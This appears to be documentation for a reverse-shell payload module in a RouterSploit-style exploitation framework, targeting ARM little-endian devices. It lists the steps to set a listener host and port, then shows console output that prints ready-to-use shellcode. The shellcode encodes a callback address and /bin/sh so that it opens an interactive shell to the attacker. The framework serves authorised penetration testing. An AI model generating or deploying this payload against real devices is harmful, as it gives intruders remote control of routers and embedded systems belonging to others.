## Description

Module generates payload that creates interactive tcp reverse shell for ARMLE architecture.

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use payloads/armle/reverse_tcp`
  3. Do: `set lhost 192.168.1.4`
  4. Do: `set lport 4321`
  5. Module generates armle reverse shell tcp payload

## Scenarios

```
rsf >
rsf > use payloads/armle/reverse_tcp
rsf (ARMLE Reverse TCP) > set lhost 192.168.1.4
[+] lhost => 192.168.1.4
rsf (ARMLE Reverse TCP) > set lport 4321
[+] lport => 4321
rsf (ARMLE Reverse TCP) > run
[*] Running module...
[*] Generating payload
[+] Building payload for python
payload = (
    "\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x02\x20\x01\x21\x92\x1a\x0f"
    "\x02\x19\x37\x01\xdf\x06\x1c\x08\xa1\x10\x22\x02\x37\x01\xdf"
    "\x3f\x27\x02\x21\x30\x1c\x01\xdf\x01\x39\xfb\xd5\x05\xa0\x92"
    "\x1a\x05\xb4\x69\x46\x0b\x27\x01\xdf\xc0\x46\x02\x00\x10\xe1"
    "\xc0\xa8\x01\x04\x2f\x62\x69\x6e\x2f\x73\x68\x00"
)
```
